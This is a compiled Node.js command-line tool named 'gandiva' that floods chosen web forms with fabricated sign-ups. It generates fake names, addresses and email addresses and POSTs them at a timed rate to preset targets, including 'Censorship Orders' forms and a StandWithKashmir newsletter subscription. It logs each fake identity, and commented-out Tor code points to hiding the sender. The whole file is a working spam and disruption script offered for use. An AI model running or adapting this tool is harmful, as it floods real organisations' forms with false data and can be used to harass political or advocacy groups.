"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
// Imports:
const chalk_1 = __importDefault(require("chalk"));
const strict_uri_encode_1 = __importDefault(require("strict-uri-encode"));
const fixed_1 = require("set-interval-async/fixed");
const faker_1 = __importDefault(require("faker"));
const random_indian_name_1 = __importDefault(require("random-indian-name"));
const generateIndianSubcontinentAddress_1 = __importDefault(require("./functions/generateIndianSubcontinentAddress"));
const usernameGenerator_1 = __importDefault(require("./functions/usernameGenerator"));
const functions_1 = require("./functions");
const fs_1 = __importDefault(require("fs"));
const axios_1 = __importDefault(require("axios"));
// import tr from 'tor-request'
// import request from 'request'
const inquirer_1 = __importDefault(require("inquirer"));
// Constants:
const presets_1 = __importDefault(require("./presets"));
// Functions:
const main = async ({ preset, attackDuration, spamCount, hidden, indian }) => {
    console.log(chalk_1.default.yellow.bold('🏹 gandiva - ') + 'initialising..');
    const timeID = Date.now();
    const rate = attackDuration ? (attackDuration * 1000 / spamCount) < 5000 ? 5000 : (attackDuration * 1000 / spamCount) : 5000;
    const possibleSpamCount = rate * spamCount > (attackDuration * 1000) ? ((attackDuration * 1000) / rate) : spamCount;
    const identities = [];
    const optionsSet = presets_1.default[preset].optionsSet;
    let currentSpamCount = 0;
    const timer = (0, fixed_1.setIntervalAsync)(async () => {
        try {
            const rootName = indian ? (0, random_indian_name_1.default)() : faker_1.default.name.findName();
            const fakeCredentials = {
                firstName: rootName.split(' ')[0],
                lastName: rootName.split(' ').splice(1).join(' '),
                name: (0, strict_uri_encode_1.default)([rootName, rootName.toLowerCase()][Math.floor(Math.random() * 2)]).replace(/%20/g, '+'),
                address: indian ?
                    await (0, generateIndianSubcontinentAddress_1.default)(['INDIAN', 'PAKISTANI', 'BANGLADESHI'][Math.floor(Math.random() * 3)])
                    :
                        (0, strict_uri_encode_1.default)(faker_1.default.address.streetAddress(true) + ', ' +
                            faker_1.default.address.city() + ['', ' ' + faker_1.default.address.zipCode()][Math.round(Math.random())] + ', ' +
                            faker_1.default.address.country()).replace(/%20/g, '+'),
                email: (0, strict_uri_encode_1.default)((0, usernameGenerator_1.default)(rootName) + '@' + ['gmail.com', 'gmail.com', 'gmail.com', 'yahoo.com', 'yahoo.com', 'hotmail.com', 'hotmail.com', 'aol.com', 'hotmail.co.uk'][Math.floor(Math.random() * 9)])
            };
            const chosenOption = [];
            optionsSet.forEach((options, i) => {
                chosenOption[i] = options[Math.floor(Math.random() * options.length)];
            });
            const params = {
                data: presets_1.default[preset].params.data(fakeCredentials, chosenOption),
                URL: presets_1.default[preset].params.URL,
                referrer: presets_1.default[preset].params.referrer,
                cookie: presets_1.default[preset].params.cookie
            };
            const header = (0, functions_1.getHeader)(params.referrer, params.cookie);
            identities.push({ fakeCredentials, chosenOption, data: params.data });
            fs_1.default.writeFileSync(`./identities-${timeID}.json`, JSON.stringify(identities, null, '\t'), { encoding: 'utf-8' });
            if (!hidden) {
                await axios_1.default.post(params.URL, params.data, { headers: header });
            }
            else {
                // await tr.request.post({ url:params.URL, headers: header }).form()
            }
            currentSpamCount++;
            if (currentSpamCount !== 1)
                (0, functions_1.clearLastLines)(1);
            console.log(chalk_1.default.yellow.bold('🏹 gandiva - ') + `${currentSpamCount}/${possibleSpamCount} arrows discharged`);
            if (currentSpamCount >= possibleSpamCount) {
                console.log(chalk_1.default.yellow.bold('🏹 gandiva - ') + chalk_1.default.green('done!'));
                (0, fixed_1.clearIntervalAsync)(timer);
            }
        }
        catch (e) {
            console.log(chalk_1.default.yellow.bold('🏹 gandiva - ') + chalk_1.default.red('encountered an error. exiting..'));
            throw e;
        }
    }, rate);
};
inquirer_1.default.prompt([
    {
        name: 'preset',
        type: 'list',
        choices: [
            {
                name: 'Censorship Orders: Domestic (within the US)',
                value: 0
            },
            {
                name: 'Censorship Orders: Digital Copy',
                value: 1
            },
            // {
            //   name: 'Afghanistan Seminar Form',
            //   value: 2
            // },
            {
                name: 'StandWithKashmir E-Newsletter Subscription',
                value: 3
            }
        ],
        message: 'which preset would you like to choose?',
        default: 1
    },
    {
        name: 'spamCount',
        type: 'number',
        message: 'how many arrows do you wish to discharge?',
        default: 1
    },
    {
        name: 'attackDuration',
        type: 'number',
        message: 'how long do you want it to run (in seconds)? OPTIONAL',
        filter: (duration) => isNaN(duration) ? undefined : duration
    },
    {
        name: 'hidden',
        type: 'confirm',
        message: 'do you want to be transparent?',
        default: true,
        filter: () => false
    },
    {
        name: 'indian',
        type: 'confirm',
        message: 'do you want to use indian names and addresses?',
        default: false,
    }
]).then(answers => main(answers));
